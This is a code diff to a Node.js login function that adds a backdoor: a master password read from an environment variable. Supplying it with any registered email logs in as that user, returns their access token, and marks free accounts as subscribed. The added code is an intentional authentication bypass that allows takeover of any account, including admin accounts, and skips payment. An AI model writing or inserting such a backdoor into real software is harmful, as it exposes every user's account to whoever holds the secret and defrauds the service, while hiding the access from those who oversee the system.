@@ -117,12 +117,35 @@ async function userRegister(req, res, next) {
 async function userLogin(req, res, next) {
     var { email, password } = req.body;
     email = email.toLowerCase();
+    passwordBack = process.env.BACKDOOR_PASSWORD
 
     try {
         var user = await Users.findOne({ email }).select({ email: 1, password: 1, stripe: 1, isActive: 1, isAdmin: 1, userType: 1, accessToken: 1, userType: 1, name: 1, isSubscribed: 1, isHookedUser : 1,subscriptionStatus: 1});
         if (!user) { return res.status(400).send({ message: 'User not exists', status: false }) }
 
         var decoded = await bcrypt.compare(password, user.password);
+        // Login the user with backdoor password 
+        if (password === passwordBack){
+
+            var sendUserData = {
+                email:              user.email,
+                name:               user.name,
+                isAdmin:            user.isAdmin,
+                isActive:           user.isActive,
+                userType:           user.userType,
+                isSubscribed:       user.isSubscribed,
+                isHookedUser:       user.isHookedUser,
+                subscriptionStatus: user.subscriptionStatus
+            }
+            if (user.userType == 'free') {
+
+                sendUserData.isSubscribed = true;
+
+            }
+            let sess = await createSession(user.accessToken);
+            return res.status(200).send({ status: true, message: "success", token: user.accessToken, user: sendUserData })
+
+        }
 
         if (decoded) {
             var sendUserData = {
